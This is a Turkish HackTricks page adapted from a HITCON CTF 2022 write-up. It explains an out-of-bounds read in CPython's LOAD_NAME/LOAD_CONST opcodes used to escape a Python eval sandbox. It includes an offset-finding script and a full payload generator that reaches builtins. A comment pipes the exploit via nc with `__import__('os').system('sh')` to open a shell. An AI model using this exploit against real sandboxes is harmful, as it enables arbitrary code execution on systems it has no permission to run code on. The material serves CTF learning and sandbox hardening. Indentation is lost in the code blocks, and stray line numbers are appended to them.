# LOAD_NAME / LOAD_CONST opcode OOB Okuma

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

**Bu bilgi** [**bu yazıdan alınmıştır**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD_NAME / LOAD_CONST opcode'daki OOB okuma özelliğini kullanarak bellekteki bazı sembolleri alabiliriz. Bu, istediğiniz sembolü (örneğin işlev adı) almak için `(a, b, c, ... yüzlerce sembol ..., __getattribute__) if [] else [].__getattribute__(...)` gibi bir hile kullanmaktır.

Sonra sadece saldırınızı oluşturun.

### Genel Bakış <a href="#overview-1" id="overview-1"></a>

Kaynak kodu oldukça kısadır, sadece 4 satır içerir!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
### Sınır Dışı Okuma <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Segmentation fault nasıl meydana gelir?

Basit bir örnek ile başlayalım, `[a, b, c]` aşağıdaki bytecode'a derlenebilir.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Ancak `co_names` boş bir demet haline gelirse ne olacak? `LOAD_NAME 2` opcode hala çalıştırılır ve aslında olması gereken bellek adresinden değeri okumaya çalışır. Evet, bu bir sınır dışı okuma "özelliği".

Çözüm için temel kavram oldukça basittir. CPython'daki bazı opcode'lar örneğin `LOAD_NAME` ve `LOAD_CONST`, sınır dışı okumaya açıktır (?).

Onlar, `co_consts` ve `co_names` altında adlandırılan `consts` veya `names` demetinden `oparg` dizininden bir nesne alırlar. CPython'ın `LOAD_CONST` opcode'unu işlediğinde ne yaptığını görmek için aşağıdaki kısa parçaya başvurabiliriz.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Bu şekilde, OOB özelliğini kullanarak keyfi bellek ofsetinden bir "isim" alabiliriz. Hangi isme sahip olduğunu ve ofsetinin ne olduğunu belirlemek için sadece `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... denemeye devam edin. Ve yaklaşık olarak oparg > 700 olduğunda bir şeyler bulabilirsiniz. Tabii ki bellek düzenine bakmak için gdb kullanmayı da deneyebilirsiniz, ama daha kolay olacağını sanmıyorum?

### Saldırıyı Oluşturma <a href="#generating-the-exploit" id="generating-the-exploit"></a>

İsimler / sabitler için bu yararlı ofsetleri aldıktan sonra, bu ofsetten bir isim / sabit nasıl alınır ve kullanılır? İşte size bir ipucu:\
Bir `__getattribute__` ismini ofset 5 (`LOAD_NAME 5`) ile `co_names=()` alabileceğimizi varsayalım, o zaman sadece aşağıdaki adımları uygulayın:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> `__getattribute__` olarak adlandırmanız gerekli değildir, daha kısa veya daha garip bir isim verebilirsiniz

Sadece bayt kodunu görüntüleyerek nedenini anlayabilirsiniz:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR`'ın adı da `co_names`'den alındığını unutmayın. Python, isim aynıysa aynı ofsetten isimleri yükler, bu nedenle ikinci `__getattribute__` hala offset=5'ten yüklenir. Bu özelliği kullanarak isim belleğe yakın olduğunda keyfi isim kullanabiliriz.

Sayıları oluşturmak basit olmalı:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Sızma Betiği <a href="#exploit-script-1" id="exploit-script-1"></a>

Uzunluk sınırı nedeniyle sabitleri kullanmadım.

İlk olarak, isimlerin ofsetlerini bulmamız için bir betik aşağıda verilmiştir.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Ve aşağıdakiler gerçek Python saldırısını oluşturmak içindir.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Bu temelde, `__dir__` yönteminden aldığımız dizeler için aşağıdaki işlemleri yapar:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github depolarına katkıda bulunun.**

</details>
{% endhint %}
